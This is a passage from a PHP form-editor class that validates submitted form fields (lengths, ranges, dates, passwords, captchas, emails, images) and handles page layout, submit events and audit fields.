                $this->errors[]         = sprintf(trn("You must %s"), $field_caption);
                $this->error_controls[] = $control_name;
              }
              break;
            case "lookup_list":  
              $found = (is_array(post($context_control_name)) and count(post($context_control_name)));
              if ($found) {
                $found = false;
                foreach(post($context_control_name) as $value) {
                  $found = strlen(safe($value, "value"));
                  if ($found)
                    break;
                }
              }
              if (!$found) {
                $this->errors[]         = $err_msg_field_required;
                $this->error_controls[] = $control_name;
              }
              break;
            case "list":  
              if (!is_array(post($context_control_name)) or !count(post($context_control_name))) {
                $this->errors[]         = $err_msg_field_required;
                $this->error_controls[] = $control_name;
              }
//              if (safe($field, "combo_max_select") and count($value) > safe($field, "combo_max_select")) {
//                $this->errors[] = sprintf(trn("Please select not more than %s options for %s"), $field["combo_max_select"], $field_caption);
//                $this->error_controls[] = $control_name;
//              }
              break;
            case "url":
              $value = post($context_control_name);
              $value = preg_replace('/^http[s]*:\/\//', '', $value);
              $value = preg_replace('/^ftp[s]*:\/\//', '', $value);
              if (!$value) {
                $this->errors[]         = $err_msg_field_required;
                $this->error_controls[] = $control_name;
              } 
              break;
            case "lookup":  
              $value = post($context_control_name);
              $value = safe($value, 'value');
              if (!strlen($value)) {
                $this->errors[]         = $err_msg_field_required;
                $this->error_controls[] = $control_name;
              } 
              break;
            case "hidden":
              break;  
            default:  
              $value = post($context_control_name);
              if (is_string($value)) {
                $value = trim($value);
                if (preg_match('/^<br[^>]*>$/is', $value))
                  $value = '';
              }
              if (!strlen($value)) {
                $this->errors[]         = $err_msg_field_required;
                $this->error_controls[] = $control_name;
              } else {
                switch ($data_type) {
                  case "date_time":
                    if (trim(post($context_control_name.__HTML_CONTROL_NAME_SEPARATOR."time")) == "") {
                      $this->errors[] = sprintf(trn("Time in %s cannot be empty"), $field_caption);
                      $this->error_controls[] = $control_name.__HTML_CONTROL_NAME_SEPARATOR."time";
                    }
                    break;
                }
              }
              break;
          }

        }

        if ($type != 'hidden') {
          switch ($data_type) {
            case "text":         
              $value = post($context_control_name);
              if (is_string($value))
                $value = trim($value); 
              if ($value) {
                if($type == "set"){
                    break;
                }
                if (($type == "file") or ($type == "image")) {
                  $pathinfo = pathinfo($value);
                  $value = safe($pathinfo, 'basename');
                }
                if (safe(safe($defs, $field["name"]), "length"))
                  if (safe(safe($defs, $field["name"]), "length") < g_strlen($value)) {
                    $this->errors[] = $field_caption." can not be longer than ".$defs[$field["name"]]["length"]." characters";
                    $this->error_controls[] = $control_name;
                  }
                if (safe($field, "min_length") and safe($field, "max_length")) {
                  if ((g_strlen($value) < $field["min_length"]) or
                      (g_strlen($value) > $field["max_length"])) {
                    if ($field["min_length"] == $field["max_length"])
                      $this->errors[] = $field_caption." must be ".$field["min_length"]." characters length";
                    else 
                      $this->errors[] = "Length of ".$field_caption." must be in range ".$field["min_length"]."..".$field["max_length"];
                    $this->error_controls[] = $control_name;
                  }
                } else
                if (safe($field, "min_length")) {
                  if (g_strlen($value) < $field["min_length"]) {
                    $this->errors[] = "Length of ".$field_caption." must be at least ".$field["min_length"]." characters";
                    $this->error_controls[] = $control_name;
                  }
                } else
                if (safe($field, "max_length")) {
                  if (g_strlen($value) > $field["max_length"]) {
                    $this->errors[] = "Length of ".$field_caption." must be less than ".($field["max_length"]+1)." characters";
                    $this->error_controls[] = $control_name;
                  }
                }
              }
              break;
            case "int":
              if ($type == "lookup") {
                $value = post($context_control_name);
                $value = safe($value, "value");
              } else  
                $value = post($context_control_name);  
              if (strlen($value) && ($type != 'ipv4')) {
                if (!is_numeric($value)) {
                  $this->errors[] = $field_caption." must be integer";
                  $this->error_controls[] = $control_name;
                } else
                if (strlen(safe($field, "min_value")) and safe($field, "max_value")) {
                  if (($value < $field["min_value"]) or
                      ($value > $field["max_value"])) {
                    $this->errors[] = $field_caption." must be in range ".$field["min_value"]."..".$field["max_value"];
                    $this->error_controls[] = $control_name;
                  }
                } else
                if (strlen(safe($field, "min_value"))) {
                  if ($value < $field["min_value"]) {
                    $this->errors[] = $field_caption." must be greater than ".$field["min_value"];
                    $this->error_controls[] = $control_name;
                  }
                } else
                if (safe($field, "max_value")) {
                  if ($value > $field["max_value"]) {
                    $this->errors[] = $field_caption." must be less than ".$field["max_value"];
                    $this->error_controls[] = $control_name;
                  }
                }
                if (strlen(safe($field, "min_length")) and safe($field, "max_length")) {
                  if ((g_strlen($value) < $field["min_length"]) or
                      (g_strlen($value) > $field["max_length"])) {
                    if ($field["min_length"] == $field["max_length"])     
                      $this->errors[] = $field_caption." must be ".$field["min_length"]." characters length";
                    else 
                      $this->errors[] = "Length of ".$field_caption." must be in range ".$field["min_length"]."..".$field["max_length"];
                    $this->error_controls[] = $control_name;
                  }
                } else
                if (strlen(safe($field, "min_length"))) {
                  if (g_strlen($value) < $field["min_length"]) {
                    $this->errors[] = "Length of ".$field_caption." must be greater than ".$field["min_length"];
                    $this->error_controls[] = $control_name;
                  }
                } else
                if (safe($field, "max_length")) {
                  if (g_strlen($value) > $field["max_length"]) {
                    $this->errors[] = "Length of ".$field_caption." must be less than ".$field["max_length"];
                    $this->error_controls[] = $control_name;
                  }
                }
              }
              break;
            case "real":
              if ($type != 'ipv4') {
                $_POST[$context_control_name] = str_replace(",", ".", post($context_control_name));
                if (post($context_control_name) && !is_numeric(post($context_control_name))) {
                  $this->errors[] = $field_caption."  must be numeric";
                  $this->error_controls[] = $control_name;
                } else {
                  $value = post($context_control_name);  
                  if (strlen($value)) {
                    if (strlen(safe($field, "min_value")) and safe($field, "max_value")) {
                      if (($value < $field["min_value"]) or
                          ($value > $field["max_value"])) {
                        $this->errors[] = $field_caption." must be in range ".$field["min_value"]."..".$field["max_value"];
                        $this->error_controls[] = $control_name;
                      }
                    } else
                    if (strlen(safe($field, "min_value"))) {
                      if ($value < $field["min_value"]) {
                        $this->errors[] = $field_caption." must be greater than ".$field["min_value"];
                        $this->error_controls[] = $control_name;
                      }
                    } else
                    if (safe($field, "max_value")) {
                      if ($value > $field["max_value"]) {
                        $this->errors[] = $field_caption." must be less than ".$field["max_value"];
                        $this->error_controls[] = $control_name;
                      }
                    }
                    if (strlen(safe($field, "min_length")) and safe($field, "max_length")) {
                      if ((g_strlen($value) < $field["min_length"]) or
                          (g_strlen($value) > $field["max_length"])) {
                        if ($field["min_length"] == $field["max_length"])     
                          $this->errors[] = $field_caption." must be ".$field["min_length"]." characters length";
                        else 
                          $this->errors[] = "Length of ".$field_caption." must be in range ".$field["min_length"]."..".$field["max_length"];
                        $this->error_controls[] = $control_name;
                      }
                    } else
                    if (strlen(safe($field, "min_length"))) {
                      if (g_strlen($value) < $field["min_length"]) {
                        $this->errors[] = "Length of ".$field_caption." must be greater than ".$field["min_length"];
                        $this->error_controls[] = $control_name;
                      }
                    } else
                    if (safe($field, "max_length")) {
                      if (g_strlen($value) > $field["max_length"]) {
                        $this->errors[] = "Length of ".$field_caption." must be less than ".$field["max_length"];
                        $this->error_controls[] = $control_name;
                      }
                    }
                  }
                }
              }
              break;
            case "date":
              if (post($context_control_name) and !check_date(post($context_control_name), safe($field, "date_format", "DMY"))) {
                $this->errors[] = $field["display_name"]." has value with invalid date format";
                $this->error_controls[] = $control_name;
              }
              break;
            case "date_time":
              if (post($context_control_name) and !check_date(post($context_control_name), safe($field, "date_format", "DMY"))) {
                $this->errors[] = $field["display_name"]." has value with invalid date format";
                $this->error_controls[] = $control_name;
              }
              if (post($context_control_name)) {
                $time = post($context_control_name.__HTML_CONTROL_NAME_SEPARATOR."time");
                $time = correct_war_time($time);
                set_post($context_control_name.__HTML_CONTROL_NAME_SEPARATOR."time", $time);
                if (!check_time($time, safe($field, "time_format", "24"))) {
                  $this->errors[] = $field_caption."  has value with invalid time format";
                  $this->error_controls[] = $control_name;
                }
              }
              break;
            case "time":
              if (post($context_control_name)) {
                $time = post($context_control_name);
                $time = correct_war_time($time);
                set_post($context_control_name, $time);
                if (!check_time($time, safe($field, "time_format", "24"))) {
                  $this->errors[] = $field_caption."  has value with invalid time format";
                  $this->error_controls[] = $control_name;
                }
              }
              break;
          }
        }

        switch ($type) {
          case "password":
            if (safe($field, 'complex_password')) {
              $value = post($context_control_name);
              if ($value and 
                  ($this->insert() or 
                  ($db->value("SELECT ".$field_name." FROM ".$this->table." WHERE ".$this->key_field." = ?", $this->key()) != $value))) {
                if (!preg_match("/[A-Z]/", $value) or 
                    !preg_match("/[a-z]/", $value) or 
                    !preg_match("/[0-9]/", $value) or 
                    (g_strlen($value) < safe($field, 'complex_password_length', 6))) {
                  $this->errors[] = trn("Password do not meet complexity criteria. It must contain uppercase, lowercase characters and numbers. Password must be at least ".safe($field, 'complex_password_length', 6)." characters.");
                  $this->error_controls[] = $control_name;
                }
              }
            }
            break;
          case "plain_password":
            if (safe($field, 'complex_password')) {
              $value = post($context_control_name);
              if ($value) {
                if (!preg_match("/[A-Z]/", $value) or 
                    !preg_match("/[a-z]/", $value) or 
                    !preg_match("/[0-9]/", $value) or 
                    (g_strlen($value) < safe($field, 'complex_password_length', 6))) {
                  $this->errors[] = trn("Password do not meet complexity criteria. It must contain uppercase, lowercase characters and numbers. Password must be at least ".safe($field, 'complex_password_length', 6)." characters.");
                  $this->error_controls[] = $control_name;
                }
              }
            }
            break;
          case "captcha":
            global $captcha;
            $value = strtolower(trim(post($context_control_name)));
            if ($value and (strtolower($captcha->value) != $value)) {
              $this->errors[] = trn("Entered text isn't the same as text on image");
              $this->error_controls[] = $control_name;
            }
            $captcha->reset();
            break;
          case "captcha_question":
            global $captcha_question;
            $value = strtolower(trim(post($context_control_name)));
            if ($value and (strtolower($captcha_question->answer) != $value)) {
              $this->errors[] = trn("The answer you entered for the captcha challenge was not correct");
              $this->error_controls[] = $control_name;
            }
            $captcha_question->reset();
            break;
          case "credit_card":
            $value = post($context_control_name);
            if ($value and 
                ($this->insert() or 
                (format_credit_card($db->value("SELECT ".$field_name." FROM ".$this->table." WHERE ".$this->key_field." = ?", $this->key())) != $value))) {
              if (!check_credit_card($value)) {
                $this->errors[] = $field_caption." doesn't look like valid credit card number";
                $this->error_controls[] = $control_name;
              }
            }
            break;
          case "ipv4":
            $value = post($context_control_name);
            if (ip_str_to_num($value) == -1) {
              $this->errors[] = $field_caption." doesn't look like valid IPv4 address";
              $this->error_controls[] = $control_name;
            }
            break;
          case "url":
            if (!check_url(post($context_control_name))) {
              $this->errors[] = sprintf(trn('%s must be valid url - starts from http:// or https:// and contain valid top level domain'), $field_caption);
              $this->error_controls[] = $control_name;
            }
            break;
          case "email":
            if (!check_email(post($context_control_name))) {
              $this->errors[] = sprintf(trn('%s must be valid e-mail address'), $field_caption);
              $this->error_controls[] = $control_name;
            }
            break;
          case "image":
            if ((count($_FILES) > 0) and file_exists($_FILES[$context_control_name]["tmp_name"])) {
              $value = $_FILES[$context_control_name]["tmp_name"];
              require_once(dirname(dirname(__FILE__))."/utils/image_file.php");
              if (image_lib_supported()) {
                $image_file = new image_file($value);
                if (!$image_file->valid) { 
                  $this->errors[] = "Please specify valid images file in ".$field_caption;
                  $this->error_controls[] = $control_name;
                } 
              } else {
                $this->errors[] = "GD2 not installed, can't check image";
                $this->error_controls[] = $control_name;
              }
            }
            break;
            case "set":
              if (post($context_control_name)) {
                $set_vals = post($context_control_name);
                $val_set = "";
                foreach($set_vals as $s_item){
                    $val_set .= $s_item.",";
                }
                $val_set = substr($val_set,0,strlen($val_set)-1);
                set_post($context_control_name, $val_set);
              }
              break;
        }
  
        if (safe($field, 'checks') && false) {
          foreach($field['checks'] as $check) {
            $arg_name  = $check['field'];
            $arg_field = $this->fields[$check['field']];
            $arg_type  =  safe($arg_field, 'type');
            $arg_data_type = safe($arg_field, 'data_type', safe(safe($defs, $arg_name), 'type', 'text'));
            $arg_control_name = $arg_field["control"];
            $arg_context_control_name = $this->context_id($arg_control_name);
            $arg_field_caption = safe($arg_field, "display_name");

            $value1 = post($context_control_name);
            switch($type) {
              case 'ipv4':
                if ($data_type != 'text')
                  $value1 = ip_str_to_num($value1);
                break;
            }
            $value2 = post($arg_context_control_name);
            switch($arg_type) {
              case 'ipv4':
                if ($arg_data_type != 'text')
                  $value2 = ip_str_to_num($value2);
                break;
            }
            switch ($check['type']) {
              case '<':
                if ($value2 <= $value1) {
                  $this->errors[] = sprintf("%s must be less than %s", $field_caption, $arg_field_caption);
                  $this->error_controls[] = $control_name;
                }
                break;
              case '>':
                if ($value2 >= $value1) {
                  $this->errors[] = sprintf("%s must be greater than %s", $field_caption, $arg_field_caption);
                  $this->error_controls[] = $control_name;
                }
                break;  
            }
          }
        }

      }

      //if (count($this->errors) and (($type == "file") or ($type == "image")))
      //  $_POST[$context_control_name] = null;
      
    }

    return (!count($this->errors));

  }

  function add_page_control($main_page_title = null, $pages_visible = false, $options = array()) {
    
    $options['main_page_title'] = $main_page_title;
    $options['pages_visible']   = $pages_visible;
    
    $this->__page_controls_amount++;
    $options['index'] = $this->__page_controls_amount;

    if (safe($options, 'save_active_page') || $this->is_apply_mode()) {
      $options['active_page'] = $this->setting('page_control_'.$this->__page_controls_amount.'_active_page');
      if (SUBMIT_MODE) {
        $this->set_setting('page_control_'.$this->__page_controls_amount.'_active_page', $this->context_post('page_control_'.$this->__page_controls_amount.'_active_page'));
        }
    }
    
    $this->container->add_page_control($options);
    
    
  }

  function add_page($title) {
    
    $this->container->add_page($title);
    
  }

  function add_separator($title = '&nbsp;') {
    
    $this->container->add_separator($title);
    
  }
  
  function add_row($value = '&nbsp;') {
    
    $this->container->add_row($value);
    
  }
  
  function add_group_label($params) {
    
    $this->container->add_group_label($params);
    
  }

  function add_column() {
    
    $this->container->add_column();
    
  }

  function add_control($control) {
    
    $this->container->add_control($control);

  }

  function add_line_break() {

    $this->container->add_line_break($control);

  }


  function add_binded($control) {

    $this->bind($control, false);
    $this->container->add_control(&$control);

  }

  function add_container_fields($container, $linked_to_field = null) {

    if ($container->controls) {
      foreach($container->controls as $control) {
        switch ($control["type"]) {
          case "field":
            $control["field"]['linked_to_field'] = $linked_to_field;
            $field_name = $control['field']['name'];
            $field_tag = (safe($control['field'], 'table')?safe($control['field'], 'table').'_':'').$control['field']['name'];
            $field = safe($this->fields, $field_tag);
            $linked_values = safe($field, 'linked_values', array());
            $this->fields[$field_tag] = $control["field"];
            if (safe($control["field"], 'linked_value'))
              $linked_values[$control["field"]["linked_value"]] = $control["field"]['control'];
            $this->fields[$field_tag]['linked_values'] = $linked_values;  
            if (safe($this->fields[$field_tag], 'enabled_if_checked')) 
              $this->fields[$this->fields[$field_tag]['enabled_if_checked']]['dependent_controls_enable'][] = $field_name;
            if (safe($this->fields[$field_tag], 'enabled_if_not_checked')) 
              $this->fields[$this->fields[$field_tag]['enabled_if_not_checked']]['dependent_controls_disable'][] = $field_name;
            if (safe($this->fields[$field_tag], 'table')) {
              if ($this->row_requested && !isset($this->tables[$this->fields[$field_tag]['table']]))
                $this->row_requested = false;
              $this->tables[$this->fields[$field_tag]['table']] = $this->key_field;
            }
            break;
          case "radio_container":
          case "container":
            $this->add_container_fields($control["value"]);
            break;
          case "radio_item":
            $this->add_container_fields($control["value"], $linked_to_field);
            break;
        }
      }
    }

  }

  function add_container($label, $container) {

    $this->container->add_container($label, $container);

    $this->add_container_fields($container);

  }

  function add_radio_container($container, $params = array()) {

    $field = null;
    if ($field = safe($params, 'field')) {
      if (!safe($field, 'label'))
        $field['label'] = safe($params, 'label');
      $field = $this->add_field($field, true);
      $params['field'] = $field;
    }

    $this->container->add_radio_container($container, $params);

    $this->add_container_fields($container, $field);

  }

  function add_field($field, $check_only = false) {

    global $dm, $db;
    
    if ($this->do_check_add_field($field)) {
      $field_name = $field['name'];
      $field_tag = (safe($field, 'table')?safe($field, 'table').'_':'').$field['name'];

      if (!array_key_exists('default', $field) and array_key_exists('always_set', $field) and !$this->get_current_value($field_name)) {
        global $db;
        if (safe($field, 'combo_table'))
          if ($default = $db->value("SELECT id FROM ".$field['combo_table']." LIMIT 0,1"))
            $field['default'] = $default;
      }

      if ($this->source_key() && safe($field, 'allow_copy')) {
        $this->get_source_row();
        if ($default = safe($this->source_row, $field_name)) {
          $defs = $dm->fields($this->table);
          $data_type = safe($field, 'data_type', safe(safe($defs, $field_name), 'type', 'text'));
          switch ($data_type) {
            case 'date_time':
            case 'date':
              $field['default'] = $db->from_datetime($default);
              break;
            default:
              $field['default'] = $default;
              break;
          }
        }
      }

      $field = $this->container->add_field($field, $check_only);

      $this->fields[$field_tag] = $field;
      
      if (safe($field, 'table')) {
        if ($this->row_requested && !isset($this->tables[$field['table']]))
          $this->row_requested = false;
        $this->tables[$field['table']] = $this->key_field;
      }

      if (safe($this->fields[$field_tag], 'enabled_if_checked')) 
        $this->fields[$this->fields[$field_tag]['enabled_if_checked']]['dependent_controls_enable'][] = $field_name;
      if (safe($this->fields[$field_tag], 'enabled_if_not_checked')) 
        $this->fields[$this->fields[$field_tag]['enabled_if_not_checked']]['dependent_controls_disable'][] = $field_name;

      if (safe($this->fields[$field_tag], 'check_list_form_filters')) { 
        foreach($this->fields[$field_tag]['check_list_form_filters'] as $filter)
          $dependent_controls_visible = safe($this->fields[$filter['form_filter']['field']], 'dependent_controls_visible');
          if (!is_array($dependent_controls_visible) or !in_array($field_name, $dependent_controls_visible))
            // only for check list for now
            $this->fields[$filter['form_filter']['field']]['dependent_controls_visible'][] = $field_name.__HTML_CONTROL_NAME_SEPARATOR.'table';
      }
      
      return $field;
    }
  
  }
  
  function do_check_add_field($field) { return true; }

  function add_button($button) {
    
    /*echo '<pre>';
    print_r(var_dump($button));
    die();
*/
    //global $EDITOR_BUTTON_DEF;
    //check_params_against($button, $EDITOR_BUTTON_DEF);

    array_push($this->buttons, $button);

  }

  function do_save() { return true; }
  function do_before_save() { return true; }
  function do_after_save($confirmation = null) { return true; }
  function do_before_draw_body($row) { }
  function do_after_draw_body($row) { }
  function do_draw_custom_field($name) { return ""; }
  function do_fill_field($field_name) { return null; }

  function submit_handled() {

    $this->set_context_post(POST_PARAM_EVENT_NAME, null);
      
  }
  
  function check_field_dependencies($modified_fields) {

    $operated_fields = array();
    while (count($modified_fields) > 0) {
      $operated_fields = array_merge($modified_fields, $operated_fields);
      $fields = $modified_fields;
      $modified_fields = array();
      foreach ($fields as $name) {
        foreach ($this->fields as $field) {
          $field_name = $field['name'];
          $depends_on = safe($field, 'depends_on');
          if ($depends_on and !is_array($depends_on))
            $depends_on = array($depends_on);
          if ($depends_on and in_array($name, $depends_on) and (!in_array($field['name'], $operated_fields) or safe($field, 'always_set'))) {
            if ($this->clear_field($field['name']))
              $modified_fields[] = $field['name'];
          }
        }
      }
    }

  }
  
  function handle_submit() {
                         
    $result = parent::handle_submit(); 
                         
    $sender_name = $this->context_post(POST_PARAM_SENDER_NAME);
    $event_name  = $this->context_post(POST_PARAM_EVENT_NAME);
    $event_value = $this->context_post(POST_PARAM_EVENT_VALUE);

    if (!$result and $event_name and ($sender_name == $this->id())) {

      switch ($event_name) {
        case "edt_ui_change":
          $modified_fields[] = $event_value;
          $this->check_field_dependencies($modified_fields);
          $this->submit_handled();
          break;  
        case "edt_goto_new":
          $this->goto_new();
          $this->submit_handled();
          break;
        case "edt_goto_prior":
          $this->goto_prior();
          $this->submit_handled();
          break;
        case "edt_goto_next":
          $this->goto_next();
          $this->submit_handled();
          break;
        case "edt_apply":
          if (!$this->apply()) {
            global $dm;
            if ($dm->error)
              $this->errors[] = $dm->error;
          }
          $this->submit_handled();
          break;
        case "edt_save_and_new":
          if (!$this->save_and_new()) {
            global $dm;
            if ($dm->error)
              $this->errors[] = $dm->error;
          }
          $this->submit_handled();
          break;
        case "edt_save_and_prior":
          $this->save_and_prior();
          $this->submit_handled();
          break;
        case "edt_save_and_next":
          $this->save_and_next();
          $this->submit_handled();
          break;
        case "edt_save":     
          if ($this->capable("save_edit"))
            $result = $this->save_and_edit();
          else
            $result = $this->save();
          if (!$result) {
            global $dm;
            if ($dm->error)
              $this->errors[] = $dm->error;
          }
          $this->submit_handled();
          break;
        case 'edt_wizard_prior':
          $this->set_wizard_step($this->get_wizard_step() - 1);
          refresh();
          break;
        case "edt_cancel":
          if ($this->capable("cancel_edit"))
            $this->cancel_and_edit();
          else
            $this->cancel();
          $this->submit_handled();
          break;
        case "edt_clear_field":
          $this->clear_field($event_value);
          $this->submit_handled();
          break;
      }

    } 

  }

  function do_render_custom_field($cell, $row, $name) {
  }

  function do_before_check_post() { return true; }
  function do_after_check_post() { return true; }

  function can_update($row) {
    return true;
  }

  function can_view($row) {
    return true;
  }

  function can_insert($row) {
    return true;
  }

  function setup_audit_page() {

    $this->add_page("Audit");
    $this->setup_audit_fields();
    
  }

  function setup_audit_fields() {
  
    global $db;
    
    $audit_info = $db->row("SELECT *"
                          ."     , usc.login created_by_name"
                          ."     , usm.login modified_by_name"
                          ."  FROM audit_info auf LEFT OUTER JOIN user usc ON auf.created_by  = usc.id"
                          ."                      LEFT OUTER JOIN user usm ON auf.modified_by = usm.id"
                          ." WHERE auf.object_id = ?"
                          ."   AND auf.table_name = ?", $this->key(), $this->table);

    $this->add_field(array( "name"         => "created_at"
                          , "display_name" => "Created At"
                          , "data_type"    => "date_time"
                          , "virtual"      => true
                          , "read_only"    => true
                          , "value"        => safe($audit_info, "created_at")
                          ));
    $this->add_field(array( "name"         => "created_by"
                          , "display_name" => "Created By"
                          , "virtual"      => true
                          , "read_only"    => true
                          , "value"        => safe($audit_info, "created_by_name")
                          ));
//    $this->add_field(array( "name"         => "created_from"
//                          , "display_name" => "Created From"
//                          , "virtual"      => true
//                          , "read_only"    => true
//                          , "value"        => safe($audit_info, "created_from")
//                          ));
    $this->add_field(array( "name"         => "modified_at"
                          , "display_name" => "Last Modified At"
                          , "data_type"    => "date_time"
                          , "virtual"      => true
                          , "read_only"    => true
                          , "value"        => safe($audit_info, "modified_at")
                          ));
    $this->add_field(array( "name"         => "modified_by"
                          , "display_name" => "Last Modified By"
                          , "virtual"      => true
                          , "read_only"    => true
                          , "value"        => safe($audit_info, "modified_by_name")
                          ));
  }
  
  function application_name() {

    if ($this->row) {
      $result = $this->get_application_name();
      if (!$result) {
        $result = $this->get_record_name();
        if ($result) 
          $result = $result.' - '.$this->title.' - '.get_config('application_name');
        else  
          $result = $this->title.' - '.get_config('application_name');
      }
      return $result;  
    }

  }
  
  function do_before_finalyze_cell($cell, $control_name) {
  }

  function do_before_finalyze_button($button, $name) {
  }
  
  function do_copy($source_key) {
    
    return false;
    
  }
  
}

?>
